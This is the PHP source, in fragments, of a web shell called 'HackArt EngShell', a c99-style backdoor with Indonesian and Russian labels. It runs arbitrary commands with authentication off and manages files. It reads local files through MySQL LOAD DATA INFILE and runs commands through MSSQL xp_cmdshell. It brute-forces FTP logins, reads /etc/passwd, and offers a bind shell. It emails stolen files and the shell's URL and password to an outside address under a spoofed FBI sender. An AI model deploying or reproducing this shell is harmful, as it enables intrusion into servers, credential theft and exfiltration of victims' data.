...
if($chk_login == true)
{
 ...
 die("
  ...
  <form method='post'>
<a href=> </a>
  <input type='password' name='pass' size='30' style='BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; FONT-SIZE: 10px; BORDER-LEFT: #ffffff 1px solid; WIDTH: 110px; BORDER-BOTTOM: #ffffff 1px solid; FONT-FAMILY: Tahoma; outline: none' >
  </form>
  </td></tr></table>
  </td></tr></table>
  ");
...
<html>
<head>
<title>HackArt EngShell <?php echo PHPSHELL_VERSION ?></title>
</head>
<body>

<?php
$language='eng';
$alamatnya1=$_SERVER['PHP_SELF'];
$alamatnya2=$_SERVER['SERVER_ADDR'];
// ?????????????? | Authentification
// $auth = 1; - ?????????????? ????????  ( authentification = On  )
// $auth = 0; - ?????????????? ????????? ( authentification = Off )
$auth = 0; 
$webnya = $_SERVER["HTTP_HOST"]; 
$injnya = $_SERVER["REQUEST_URI"];

// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)
// ?? ???????? ??????? ????? ??????????? ?? ???????!!! (CHANGE THIS!!!)
// ????? ? ?????? ????????? ? ??????? ????????? md5, ???????? ?? ????????? 'e99'
// Login & password crypted with md5, default is 'e99'
$name='e79ec2c5c152b12fbd320771535cdbd0'; // ????? ????????????  (user login)
$pass='c7c5231523105089296465342e627f51'; // ?????? ???????????? (user password)
/******************************************************************************************************/
error_reporting(0);
...
if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
      ...
      switch($sql->query($query))
       ...
       if($sql->get_result())
        ...
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       	$keys = @implode("&nbsp;</b></font></td><td bgcolor=#000000><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#000000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
 ...
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">MBALIK</a> ]</b></font></div>"; die();
 }	
...
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
...
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
...
'ru_err7'=>'?????? ??????????',
/* --------------------------------------------------------------- */
'eng_text1' =>'EngShell command',
'eng_text2' =>'EngShell command on server',
...
'eng_text104'=>'Kirim file ke email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
...
'Cek Port yg terbuka'=>'netstat -an | grep -i listen',
'Cek File passwd'=>'more /etc/passwd',
'Lihat IP shell'=>'/sbin/ifconfig | grep inet',
'Lihat VHOST'=>'cat /etc/hosts',
'Lihat domain apa saja yg ada disini'=>'ls -lia /var/named',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#000000><font face=Verdana size=-2><b><div align=center>&curren; ";
$table_up2  = " &laquo;</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=red>Y</font>";
...
if(!$safe_mode && strpos(ex("echo abce99"),"e99")!=3) { $safe_mode = 1; }
...
//@print "Version ".$current_version." :P";
//@readfile ("http://rst.void.ru/EngShell99_version/version.php?version=".$current_version."");}
}  
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#009F00 width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6 color=red><b>"</b></font><b>'.ws(2).'EngShell'.$version.'<font face=Webdings size=6 color=red><b>@</b> </b></font></td><td bgcolor=#009F00><font face=Verdana size=-2>';
...
echo (($safe_mode)?("<font color=green>SAFEMODE-IS-ON</font>"):("<font color=red>SAFEMODE-IS-OFF</font>"));
echo "</b>".ws(2);
...
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 ...
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
  ...
  {	
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from EngShell99'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'admin@fbi.gov'; }
     ...
     case 'file':
      if($_POST['action'] == "create")
       ...
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
        ...
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      ...
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
...
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 ...
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }
...
if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 ...
 else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#000000><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=17>";
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 ...
 break;
  ...
  if($db)
   ...
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     @mysql_query("DROP TABLE IF EXISTS temp_e99_table");
     @mysql_query("CREATE TABLE `temp_e99_table` ( `file` LONGBLOB NOT NULL )");
     @mysql_query("LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_e99_table");
     $r = @mysql_query("SELECT * FROM temp_e99_table");
  ...
  if($db)
   ...
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table e99_temp_table",$db);
     @mssql_query("create table e99_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into e99_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from e99_temp_table",$db);
...
echo "</textarea></div><center><font size=1 color=green>tar cvzf googlecom.tgz /home/networks/domains/google.com/public_html<br>mysqldump -u USER -pPASSWORD DATABASE > HASILBACKUP.sql</font></center>";
echo "</b>";
echo "</td></tr></table>";
...
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("admin@fbi.gov"))));
...
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("iamnothacker@yahoo.co.id"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("admin@fbi.gov"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello hacker"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("Ini setoranku boss : http://$webnya$injnya passwordnya : $password")).'</textarea>');
...
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("iamnothacker@yahoo.co.id"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("admin@fbi.gov"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from EngShell99"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
...
echo $te."<div align=center id='n'><textarea cols=55 rows=3 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSHOW TABLES;\nSELECT * FROM user;"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
}
if(!$safe_mode&&$unix){
...
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'e99'));
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o-[ HackArt - EngShell99 version ".$version." ]-o</b></font></div></td></tr></table>".$f;
echo '</body></html>';
?>